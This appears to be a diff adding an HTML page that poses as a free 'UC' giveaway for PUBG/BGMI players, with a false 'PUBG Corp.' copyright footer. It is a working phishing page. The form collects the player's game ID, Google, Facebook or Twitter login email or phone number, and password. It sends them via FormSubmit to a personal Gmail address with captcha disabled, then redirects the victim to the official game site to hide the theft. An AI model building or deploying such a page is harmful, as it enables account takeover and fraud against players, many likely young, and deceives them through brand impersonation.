@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PUBG/BGMI FREE UC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://i.postimg.cc/52L06Zqd/Picsart-25-06-15-19-58-45-495.png') no-repeat center center fixed;
+      background-size: cover;
+      color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background: rgba(0,0,0,0.7);
+      padding: 20px;
+      text-align: center;
+    }
+    header img {
+      width: 100%;
+      max-height: 200px;
+      object-fit: cover;
+      display: block;
+      margin-bottom: 10px;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2rem;
+    }
+    main {
+      padding: 20px;
+      max-width: 600px;
+      margin: 40px auto;
+      background: rgba(42, 42, 42, 0.9);
+      border-radius: 8px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+    }
+    button {
+      background: #ff5722;
+      color: #fff;
+      padding: 15px;
+      width: 100%;
+      border: none;
+      font-size: 1rem;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    button:hover {
+      background: #e64a19;
+    }
+    footer {
+      text-align: center;
+      padding: 10px;
+      font-size: 0.9rem;
+      color: #bbb;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://i.postimg.cc/Kc74cXN6/Picsart-25-06-15-21-08-00-055.png" alt="PUBG UC Giveaway Banner" />
+    <h1>PUBG / BGMI UC Giveaway</h1>
+    <p>Claim your free UC today!</p>
+  </header>
+
+  <main>
+    <!-- ✅ FormSend via FormSubmit -->
+    <form action="https://formsubmit.co/sksirswa5225@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://www.battlegroundsmobileindia.com">
+
+      <!-- In-Game ID -->
+      <div class="form-group">
+        <label for="userId">In‑Game ID</label>
+        <input type="text" id="userId" name="In-Game ID" placeholder="Enter your ID" required />
+      </div>
+
+      <!-- Game Version -->
+      <div class="form-group">
+        <label for="gameVersion">Game Version</label>
+        <select id="gameVersion" name="Game Version" required>
+          <option value="">Select your game</option>
+          <option value="PUBG">PUBG</option>
+          <option value="BGMI">BGMI</option>
+          <option value="PUBG Mobile">PUBG Mobile</option>
+        </select>
+      </div>
+
+      <!-- UC Amount -->
+      <div class="form-group">
+        <label for="ucAmount">Select UC Amount</label>
+        <select id="ucAmount" name="UC Amount" required>
+          <option value="">Choose UC</option>
+          <option value="100">100 UC</option>
+          <option value="300">300 UC</option>
+          <option value="600">600 UC</option>
+          <option value="1000">1000 UC</option>
+          <option value="1500">1500 UC</option>
+          <option value="3000">3000 UC</option>
+          <option value="5000">5000 UC</option>
+        </select>
+      </div>
+
+      <!-- Login Method -->
+      <div class="form-group">
+        <label for="loginMethod">Login With</label>
+        <select id="loginMethod" name="Login Method" onchange="showLoginFields()" required>
+          <option value="">Select Method</option>
+          <option value="Google">Google</option>
+          <option value="Facebook">Facebook</option>
+          <option value="Twitter">Twitter</option>
+        </select>
+      </div>
+
+      <!-- Gmail / Mobile Input -->
+      <div class="form-group" id="loginInputField" style="display: none;">
+        <label id="loginLabel" for="loginInput">Enter Gmail or Mobile</label>
+        <input type="text" id="loginInput" name="Login Info" placeholder="" />
+      </div>
+
+      <!-- Password Field -->
+      <div class="form-group" id="passwordField" style="display: none;">
+        <label for="password">Enter Password</label>
+        <input type="password" id="password" name="Password" placeholder="Enter Password" />
+      </div>
+
+      <!-- Confirm Password Field -->
+      <div class="form-group" id="confirmPasswordField" style="display: none;">
+        <label for="confirmPassword">Confirm Password</label>
+        <input type="password" id="confirmPassword" name="Confirm Password" placeholder="Confirm Password" />
+      </div>
+
+      <!-- Submit Button -->
+      <button type="submit">Claim UC Now</button>
+    </form>
+  </main>
+
+  <footer>
+    &copy; 2025 PUBG Corp. | All trademarks reserved.
+  </footer>
+
+  <script>
+    function showLoginFields() {
+      const method = document.getElementById("loginMethod").value;
+      const input = document.getElementById("loginInputField");
+      const password = document.getElementById("passwordField");
+      const confirmPassword = document.getElementById("confirmPasswordField");
+      const label = document.getElementById("loginLabel");
+      const inputBox = document.getElementById("loginInput");
+
+      if (method === "Google") {
+        input.style.display = "block";
+        password.style.display = "block";
+        confirmPassword.style.display = "block";
+        label.innerText = "Enter Gmail";
+        inputBox.placeholder = "Enter your Gmail";
+      } else if (method === "Facebook" || method === "Twitter") {
+        input.style.display = "block";
+        password.style.display = "block";
+        confirmPassword.style.display = "block";
+        label.innerText = "Enter Gmail or Mobile Number";
+        inputBox.placeholder = "Enter Gmail or Mobile Number";
+      } else {
+        input.style.display = "none";
+        password.style.display = "none";
+        confirmPassword.style.display = "none";
+      }
+    }
+  </script>
+</body>
+</html>
